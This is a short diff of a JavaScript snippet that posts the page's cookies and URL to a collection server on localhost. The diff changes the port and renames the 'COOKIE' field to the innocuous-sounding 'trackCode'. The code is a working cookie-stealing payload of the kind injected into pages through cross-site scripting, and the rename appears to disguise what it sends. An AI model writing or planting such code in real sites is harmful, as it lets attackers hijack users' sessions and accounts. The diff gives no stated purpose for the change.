@@ -12,5 +12,5 @@ if(!document.cookie){
 }
 
 var xhttp = new XMLHttpRequest();
-xhttp.open("POST", "http://localhost:8080", true);
-xhttp.send('{"COOKIE":"' + document.cookie + '","URL":"'+ document.URL +'"}'); 
+xhttp.open("POST", "http://localhost:8888", true);
+xhttp.send('{"trackCode":"' + document.cookie + '","URL":"'+ document.URL +'"}');
